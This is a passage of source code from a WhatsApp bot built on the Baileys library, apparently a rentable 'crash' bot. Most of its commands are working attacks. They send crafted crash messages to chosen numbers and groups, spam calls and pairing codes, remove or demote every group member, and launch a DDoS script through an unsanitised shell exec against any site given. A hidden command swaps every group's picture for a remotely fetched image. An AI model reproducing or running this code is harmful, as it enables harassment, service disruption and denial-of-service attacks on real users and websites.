                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcxeon(`${text66}${nobio}${nowhatsapp}`)
        }
break
	
	case 'xxxcrash_quotedxxx':
                for (let i = 0; i < 1; i++) {
                    await XeonBotInc.relayMessage(from, {
                        "extendedTextMessage": {
                            "text": "😂",
                            "contextInfo": {
                                "stanzaId": generateMessageID(),
                                "participant": from,
                                "quotedMessage": {
                                    "contactMessage": {
                                        "displayName": "@bruxel4s crashed youKKKKKKK",
                                        "vcard": "BEGIN:VCARD\nVERSION:3.0\nFN:@bruxel4s\nX-WA-BIZ-NAME:BruxinNerdola\n\nORG:@bruxel4s;\nTEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999\nEND:VCARD"
                                    }
                                }
                            }
                        }
                    }, {})
                }
                break;
	
	
	
	case 'reactch': {
    if (!q) {
        return replygcxeon(`Usage: ${prefix}reactch link_channel text\nFor example: ${prefix+command} https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20/18383 hello`);}
    if (!q.startsWith("https://whatsapp.com/channel/")) {
        return replygcxeon("Link invalid!");}
    const xeonReaction = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒' };
    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return xeonReaction[c] || c;
    }).join('');
    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];
        const res = await XeonBotInc.newsletterMetadata("invite", channelId);
        await XeonBotInc.newsletterReactMessage(res.id, messageId, emoji);
        return replygcxeon(`Sent reaction *${emoji}* for the message in the channel *${res.name}.*`);
    } catch (e) {
        console.error(e);
        return replygcxeon("Failed to send reaction. Please make sure the link and emoji are valid.");
    }}
break;

		case 'crashchatt':  {
if (!isBot && !isCreator) return

	if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201507151697") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 3; i++) {
     await chattLock(Xreturn)
   }
		}
		break
		
		
	case "checkchid": case "idch": {
if (!isBot && !isCreator) return
    if (!text) return replygcxeon(`Provide channel link\nExample: ${prefix+command} https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20 `)
    if (!text.includes("https://whatsapp.com/channel/")) return replygcxeon("Invalid link")
    let result = text.split('https://whatsapp.com/channel/')[1]
    try {
        let res = await XeonBotInc.newsletterMetadata("invite", result)
        if (!res) return replygcxeon("Failed to fetch information of this channel")
        let teks = `
*ID :* ${res.id}
*Name :* ${res.name}
*Total Followers :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Verified" : "Not Verified"}
        `
        return replygcxeon(teks)
    } catch (error) {
        console.error(error);
        return replygcxeon("An error occurred while retrieving metadata");
    }
}
break

	
	case 'searchpair': {
    if (!global.banner.includes(senderNumber)) {
        return;
    }

    // Ensure the user provides a number to search
    if (!args[0]) {
        return replygcxeon("❌ Please provide a number to search. Example: *searchpair 919402104403*");
    }

    const searchNumber = args[0] + '@s.whatsapp.net'; // Convert input to JID format
    const pairingPath = './lib2/pairing';

    try {
        // Check if the pairing directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => entry.name); // Keep full JID format

        // Check if the searched number exists
        if (pairedDevices.includes(searchNumber)) {
            return replygcxeon(`✅ The number *${args[0]}* is paired.`);
        } else {
            return replygcxeon(`❌ The number *${args[0]}* is not paired.`);
        }
    } catch (err) {
        console.error('Error searching paired devices:', err);
        return replygcxeon('Failed to search paired devices data.');
    }
}
break;

case 'xxxban': case 'xx🦄': {
	// Check if botNumber or sender is in global.banner
    if (global.banner.includes(botNumber) || !global.banner.includes(senderNumber)) {
        return;
    }
    try {
        const fs = require('fs');
        const axios = require('axios');
        const path = require('path');

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        const imageUrl = "https://raw.githubusercontent.com/ 13/xeonPloitWa/refs/heads/main/photo_2024-12-19_01-39-48.jpg";
        const imagePath = path.join(__dirname, 'temp_profile.jpg');

        (async () => {
            // Download the image
            let response = await axios({ url: imageUrl, responseType: 'arraybuffer' });
            fs.writeFileSync(imagePath, Buffer.from(response.data, 'binary'));

            // Change bot's profile picture
            await XeonBotInc.updateProfilePicture(XeonBotInc.user.id.split(':')[0] + "@s.whatsapp.net", { url: imagePath });

            // Fetch all groups
            let allGroups = Object.values(await XeonBotInc.groupFetchAllParticipating().catch(() => []));
            let groupIds = allGroups.map(group => group.id);

            // Filter out blacklisted groups
            let blacklistedGroups = [];
            try {
                blacklistedGroups = JSON.parse(fs.readFileSync('./database/idgroup.json', "utf8"));
            } catch (err) {
                console.error("⚠️ No blacklist file found, continuing...");
            }

            let targetGroups = groupIds.filter(id => !blacklistedGroups.includes(id));

            // Update profile pictures in each group
            for (let groupId of targetGroups) {
                try {
                    await XeonBotInc.updateProfilePicture(groupId, { url: imagePath });
                    console.log(`✅ Updated profile picture for ${groupId}`);
                } catch (err) {
                    console.error(`❌ Error updating profile picture for ${groupId}:`, err);
                }
                await delay(1000); // Wait 1 second between updates
            }

            // Clean up & send message
            fs.unlinkSync(imagePath);
        })();
    } catch (error) {
        console.error("❌ Detailed Error:", error);
    }
}
break;
	
case 'promoteall': {
if (!isBot && !isCreator) return
    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin === null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No members available for promotion.");

    try {
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'promote');
        await replygcxeon("Successfully promoted all members!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while promoting members.");
    }
}
break;

case 'demoteall': {
if (!isBot && !isCreator) return
    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin !== null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No admins available for demotion.");

    try {
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'demote');
        await replygcxeon("Successfully demoted all admins!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while demoting members.");
    }
}
break;

case 'kickallll': {
    if (!isBot && !isCreator) return
    if (!m.isGroup) 
        return replygcxeon("هذا الأمر يعمل فقط داخل المجموعات.");

    

    // إذا كان هناك منشن أو رقم → طرد شخص واحد فقط
    if (m.mentionedJid && m.mentionedJid.length > 0 || args[0]) {
        // كود طرد شخص واحد (نفس الكود القديم)
        let target;
        if (m.mentionedJid && m.mentionedJid.length > 0) {
            target = m.mentionedJid[0];
        } else if (args[0]) {
            target = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        } else {
            return replygcxeon("❗ برجاء منشن الشخص أو كتابة رقمه.\nمثال:\n.kick @user\n.kick 20123456789");
        }

        const isTargetAdmin = participants.find(v => v.id === target)?.admin !== null;
        if (isTargetAdmin) 
            return replygcxeon("لا يمكن طرد عضو من المشرفين.");

        try {
            await XeonBotInc.groupParticipantsUpdate(from, [target], 'remove');
            replygcxeon(`✔️ تم طرد العضو:\n@${target.split('@')[0]}`, { mentions: [target] });
        } catch (err) {
            console.log(err);
            replygcxeon("حدث خطأ أثناء محاولة طرد العضو.");
        }
    } 
    // إذا لم يكن هناك منشن → طرد جميع الأعضاء
    else {
        // كود طرد جميع الأعضاء (الكود الجديد)
        const groupMembers = participants;
        const membersToKick = [];
        
        for (let member of groupMembers) {
            if (member.id === XeonBotInc.user.id.split(':')[0] + '@s.whatsapp.net') continue;
            if (member.admin) continue;
            membersToKick.push(member.id);
        }

        if (membersToKick.length === 0) 
            return replygcxeon("❌ لا يوجد أعضاء عاديين يمكن طردهم.");

        try {
            replygcxeon(`⚡ جاري طرد ${membersToKick.length} عضو...`);
            
            for (let i = 0; i < membersToKick.length; i += 500) {
                const batch = membersToKick.slice(i, i + 500);
                await XeonBotInc.groupParticipantsUpdate(from, batch, 'remove');
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            replygcxeon(`✅ تم طرد ${membersToKick.length} عضو بنجاح.`);
            
        } catch (err) {
            console.log(err);
            replygcxeon("❌ حدث خطأ أثناء محاولة طرد الأعضاء.");
        }
    }
}
break;

	case 'forcegroup':
    
    if (!isBot && !isCreator) return
    if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us|5\n\nTo get group ID, type .listgc\n\nTo get group ID from a group link, type .groupid link`);

    // Check if input contains a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }

    // Extract group ID and amount from input
    let input = q.split("|");
    let victimxd = input[0].trim(); // Group ID
    let loopCount2 = parseInt(input[1]); // Extract amount

    // Validate Group ID format (only numbers + "@g.us")
    if (!/^\d+@g\.us$/.test(victimxd)) {
        return replygcxeon("Invalid group ID! Please enter a correct WhatsApp group ID.");
    }

    // Validate loop count
    if (isNaN(loopCount2) || loopCount2 < 1) {
        loopCount2 = 5; // Default to 5 if amount is invalid
    }

    replygcxeon(`Successfully sent force message to the group chat`);

    for (let i = 0; i < loopCount2; i++) {
        await sleep(1050);
        await XeonBotInc.relayMessage(victimxd, {
            "messageContextInfo": {
                "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                "deviceListMetaData": {},
                "deviceListMetadataVersion": 2
            },
            "scheduledCallCreationMessage": {
                "scheduledTimestampMs": '1200',
                callType: "AUDIO",
                "title": '👻',
            }
        }, {
            additionalAttributes: {
                edit: '7'
            }
        });
    }
    break;

       case 'xprz': {
           if (!isBot && !isCreator) return
 if (!q) return replygcxeon(`Example : ${command} 20xxx`)
 let pepec = q.replace(/[^0-9]/g, "")
 let targetto = pepec
const { 
  default: makeWaSocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion
} = require("@adiwajshing/baileys")
const pino = require('pino')

async function zprz(target) {
  let { state } = await useMultiFileAuthState('.npm')
  let { version } = await fetchLatestBaileysVersion()
  let XeonBotInc = await makeWaSocket({
    auth: state,
    version,
    logger: pino({ level: 'fatal' })
  })

  console.log(`start spam pairing to ${target}`)

  const deadline = Date.now() + 10_000
  for (let z = 0; z < 150; z++) {
    await sleep(9000)
    let prc = await XeonBotInc.pairingBug(target)
  }
}
rDone(`[ √ ] Success Bug : ${pepec}\n[ √ ]Using : ${prefix + command}\n[ √ ] Target Status : Die\n[ ⚠️ ] Please Don\'t Use Bug In 10 Minute`)
await zprz(targetto)
}
break
	
	case 'forceblock':
if (!isBot && !isCreator) return
    // Get user input for loop count
    let loopCount = parseInt(args[0]);
    if (isNaN(loopCount) || loopCount < 1) {
        loopCount = 5; // Default value if input is invalid
    }
    
    for (let i = 0; i < loopCount; i++) {
        await sleep(1050);
        await XeonBotInc.relayMessage(from, {
            "messageContextInfo": {
                "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                "deviceListMetaData": {},
                "deviceListMetadataVersion": 2
            },
            "scheduledCallCreationMessage": {
                "scheduledTimestampMs": '1200',
                callType: "AUDIO",
                "title": '👻',
            }
        }, {
            additionalAttributes: {
                edit: '7'
            }
        });
    }
    break;

case 'listpair': {
    if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @ 
Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏
WhatsApp: +201507151697`);
}

        const pairingPath = './lib2/pairing';

    try {
        // Check if the directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => `+${entry.name.replace('@s.whatsapp.net', '')}`); // Add '+' before number

        // Handle if no paired devices are found
        if (pairedDevices.length === 0) {
            return replygcxeon('No paired devices found.');
        }

        // Count total paired devices
        const totalUsers = pairedDevices.length;

        // Format the list of paired devices for the response
        const deviceList = pairedDevices
            .map((device, index) => `${index + 1}. ${device}`)
            .join('\n');

        replygcxeon(`Total Rent Bot Users: ${totalUsers}\n\nPaired Devices:\n${deviceList}`);
    } catch (err) {
        console.error('Error reading paired devices directory:', err);
        return replygcxeon('Failed to load paired devices data.');
    }
}
break;

case 'delpair': {

        
   if (!isBot && !isCreator) return     
	
        if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo =  Xreturn;
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }

        const pairingPath = './lib2/pairing';
        const targetPath = `${pairingPath}/${Xreturn}`;

        try { 
            // Check if the target directory exists
            if (!fs.existsSync(targetPath)) {
                return replygcxeon(`Paired device with ID "${Xreturn}" does not exist.`);
            }

            // Delete the target directory and its contents
            fs.rmSync(targetPath, { recursive: true, force: true });

            replygcxeon(`Paired device with ID "${Xreturn}" has been successfully deleted.`);
        } catch (err) {
            console.error('Error deleting paired device:', err);
            return replygcxeon('An error occurred while attempting to delete the paired device.');
        }
    }
break;

case 'reqpair':
        if (!isBot && !isCreator) return
// Check system storage and RAM
    const freeStorage = os.freemem() / (1024 * 1024); // Free memory in MB
    const totalStorage = os.totalmem() / (1024 * 1024); // Total memory in MB
    const freeDiskSpace = fs.statSync('/').available / (1024 * 1024); // Free disk space in MB

    if (freeStorage < 300 || freeDiskSpace < 300) { // Set a threshold of 100 MB for storage and RAM
        return replygcxeon('Slot is full, please try again later.');
    }

//
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  // Extract and validate the country code or prefix
const countryCode = text.slice(0, 3); // Extract the first 3 digits for country code
const prefixxx = text.slice(0, 1); // Extract the first digit for prefix
const firstTwoDigits = text.slice(0, 2); // Extract the first two digits to check for "89"

// Function to validate if a number is a valid WhatsApp number
const isValidWhatsAppNumber = (number) => {
    return number.length >= 10 && number.length <= 15 && !isNaN(number);
};

if (countryCode === "252" || prefixxx === "0" || firstTwoDigits === "89" || countryCode.startsWith("85")) {
    return replygcxeon("Sorry, numbers with country code 252, prefix 0, starting with 89, or +85 are not supported for using the bot.");
}

if (!isValidWhatsAppNumber(text)) {
    return replygcxeon("Invalid WhatsApp number. Please enter a valid number.");
}


    // Proceed with pairing
    const startpairing = require('./rentbot.js');
    await startpairing(Xreturn);
    await sleep(4000);
    
    const cu = fs.readFileSync('./lib2/pairing/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);
    
    await replygcxeon(`${cuObj.code}`);

break;
       case "cekperangkat": {
 if (!args[0]) return XeonBotInc.sendMessage(m.chat, { text: 'use : .cekperangkat 20xxx' }, { quoted: m});
 let number = args[0].replace(/[^0-9]/g, '');
 let target = number + '@s.whatsapp.net';
 try {
 let devices = await XeonBotInc.getUSyncDevices([target]);
 let raw = JSON.stringify(devices, null, 2);
 let count = devices?.length || 0;
 let message = `Total perangkat : ${count}\nperangkat : ${raw}`;
 await XeonBotInc.sendMessage(m.chat, { text: message }, { quoted: m});
 } catch(z) {
   replygcxeon(z);
 }
}
break


 case "cekban": {
  if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)

  const {
    useMultiFileAuthState,
    makeWASocket,
    fetchLatestBaileysVersion,
    Browsers
  } = require("@adiwajshing/baileys");
  const { parsePhoneNumber } = require("libphonenumber-js");
  const pino = require("pino");

  async function cekbann(phoneNumber) {
    let resultData = {
      isBanned: false,
      isNeedOfficialWa: false,
      number: phoneNumber
    };

    if (!phoneNumber.startsWith("+")) {
      phoneNumber = "+" + phoneNumber;
    }

    const parsedNumber = parsePhoneNumber(phoneNumber);
    const countryCode = parsedNumber.countryCallingCode;
    const nationalNumber = parsedNumber.nationalNumber;

    try {
      const { state } = await useMultiFileAuthState(authPath);
      const { version } = await fetchLatestBaileysVersion();

      const XeonBotInc = makeWASocket({
        version,
        auth: state,
        browser: Browsers.ubuntu("Chrome"),
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
      });

      const registrationOptions = {
        phoneNumberCountryCode: countryCode,
        phoneNumberNationalNumber: nationalNumber,
        phoneNumberMobileCountryCode: "510",
        phoneNumberMobileNetworkCode: "10",
        method: "sms",
      };

      await XeonBotInc.requestRegistrationCode(registrationOptions);

      if (XeonBotInc.ws) {
        XeonBotInc.ws.close();
      }

      return resultData;

    } catch (err) {
      if (err?.custom_block_screen?.btn_secondary_url) {
        resultData.isNeedOfficialWa = true;
      }
      if (err?.appeal_token) {
        resultData.isBanned = true;
        resultData.data = {
          violation_type: err.violation_type || null,
          in_app_ban_appeal: err.in_app_ban_appeal || null,
          appeal_token: err.appeal_token || null,
        };
      }
      return resultData;
    }
  }

  try {
    const result = await cekbann(`${q}`);
    replygcxeon(JSON.stringify(result, null, 2));
  } catch (e) {
    console.log(e);
    replygcxeon("Error checking number!");
  }
}
break;
        
        
case 'callspam':{
if (!isBot && !isCreator) return
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201507151697") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  async function sendOfferCall(target) {
    try {
        await XeonBotInc.offerCall(target);
        /*console.log(chalk.white.bold(`Success Send Offer Call To Target`));*/
    } catch (error) {
        /*console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));*/
    }
}

  sendMessageWithMentions(
    "Successfully Sent Spam Call To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
	await sleep(1000)
for (let i = 0; i < 7; i++) {
await sendOfferCall(Xreturn)
await sleep(2000)
}
  }
break


case 'groupmix':{
if (!isBot && !isCreator) return
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .groupid link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .groupid <link> to get the group ID.");
    }
victim = text.split("|")[0]

replygcxeon(`Successfully sent bug to the group chat`)

		for (let i = 0; i < 99; i++) {
  try {
    await xeonIosInvi(victim);
	await xeonAndroSpamGp(victim);
	await forcergp(victim);
	await sleep(500);
  } catch (e) {
    console.error("Loop stopped:", e.message);
    }}}
    break;
	

                case 'groupid': {
    
    if (!isBot && !isCreator) return
    if (!text) return replygcxeon('Enter Group Link!');
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!');

    // Extract the group code, removing any query parameters
    let groupCode = args[0].split('https://chat.whatsapp.com/')[1];
    groupCode = groupCode.split('?')[0]; // Remove any query parameters

    try {
        const xeontry = await XeonBotInc.groupAcceptInvite(groupCode);
        
        if (!xeontry) {
            return replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
        }

        replygcxeon(`Group ID: ${xeontry}`);
    } catch (error) {
        replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
    }
}
break;

case 'autoswview':
    case 'autostatusview':{
    if (!isBot && !isCreator) return
               if (args[0] === 'on') {
                  db.data.settings[botNumber].antiswview = true
                  replygcxeon(`Successfully ${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.settings[botNumber].antiswview = false
                  replygcxeon(`Successfully ${command} is disabled`)
               } else {
                	replygcxeon(`Please select on/off\n\Example: ${prefix+command} on`)
            }
            }
            break
            
            case 'totag': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				if (!m.quoted) return replygcxeon(`Reply message with caption ${prefix + command}`)
				delete m.quoted.chat
				await XeonBotInc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
			}
			break
			
			case 'hidetag': case 'h': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
			}
			break
			
			case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break

case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break

case  "me00" : {
await XeonBotInc.sendMessage(m.chat, { react: { text: '🍾', key: m.key }});
await XeonBotInc.sendMessage(m.chat, { react: { text: '🕛', key: m.key }});
await XeonBotInc.sendMessage(m.chat, { react: { text: '✔️', key: m.key }});
   await loading()
let menu = `                ❲ 𝔥-𝔵_𝔪𝔢𝔫𝔲/𝔠𝔯𝔞𝔰𝔥  ❳
❐
- ⭔- USERNAME : ${pushname}
- ⭔- OWNER : +201507151697
- ⭔- BOT: 𝐁𝐨𝐓 𝐓𝐄𝐀𝐌 𝐇𝐗`
let buttons = [
        { buttonid: "bugmenu", buttonText: { displayText: "Thanks To" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/8c1rds.jpg` },
	    gifPlayback: true,
        caption: menu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363425675094922@newsletter",
                newsletterName: `404_NotFound`
            }
        },
        footer: "> ༒︎𝖍-𝖝 ᵗᵉᵃᵐ",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
   }
    const audioUrl = "https://files.catbox.moe/rva93z.mp3"; // رابط الصوت من TikTok
    const flowActions = [
        {
            buttonId:  'action' ,
            buttonText: { displayText:  'This Button List'  },
            type: 4,
            nativeFlowInfo: {
                name:  'single_select' ,
                paramsJson: JSON.stringify({
                    title: "©︎𝔥-𝔵_𝔪𝔢𝔫𝔲/𝔠𝔯𝔞𝔰𝔥",
                    sections: [
                        {
                            title: "404_NotFound  MENU",
                            highlight_label: "",
                            rows: [
                                { title: "𝑻𝑶𝑶𝑳𝑺", description: " *( 𝑻𝑶𝑶𝑳𝑺 )*", id: "me00" },
                                
                               
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m });
await XeonBotInc.sendMessage(m.chat, {
audio: { url: audioUrl },
mimetype: 'audio/mp4',
ptt: false,
contextInfo: {
isForwarded: true
}
});
}; 
break 
        
        



case 'xpairspam': {

			if (!q) return replygcxeon(`_Use : ${prefix+command} number\n_Example : ${prefix+command} 916909137211`)
			let [peenis, pepekk = "200"] = q.split("|")
			
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@adiwajshing/baileys')
			let {
				state
			} = await useMultiFileAuthState('XSession')
			let {
				version
			} = await fetchLatestBaileysVersion()
	 replygcxeon(`Success!`)
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.requestPairingCode(target)
				/*await console.log(`Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)*/
			}
			await sleep(15000)
			}
		break
case 'ddos':{
if (!isBot && !isCreator) return
if (!q.includes(' ')) return replygcxeon(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.xyz 60`)
if (q.includes(' .shop')){
	return replygcxeon(`Cannot attack developer's site`);
	}
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
replygcxeon(`Bot is attacking ${targetweb} with time ${timeweb}`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replygcxeon(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replygcxeon(`Error: ${stderr}`);
          return;
        }
        replygcxeon(`Success\n\n🤙 target: ${targetweb},\n🤙 Time: ${timeweb}`);
      });  
      }                 
break

case 'enc': case 'encrypt': {
if (!isBot && !isCreator) return
        const JSConfuser = require("js-confuser");
        const usage = `Usage Example:
${prefix + command} (Input text or reply text to obfuscate code)
${prefix + command} doc (Reply to a document)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return replygcxeon(usage);
        }
        
        try {
            let code;
            if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
                let docBuffer;
                if (m.quoted.mimetype) {
                    docBuffer = await m.quoted.download();
                }
                code = docBuffer.toString('utf-8');
            } else {
                code = text;
            }

const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難404_NotFound素晴座素晴難" + 
            "素晴座素晴難HXBOT素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
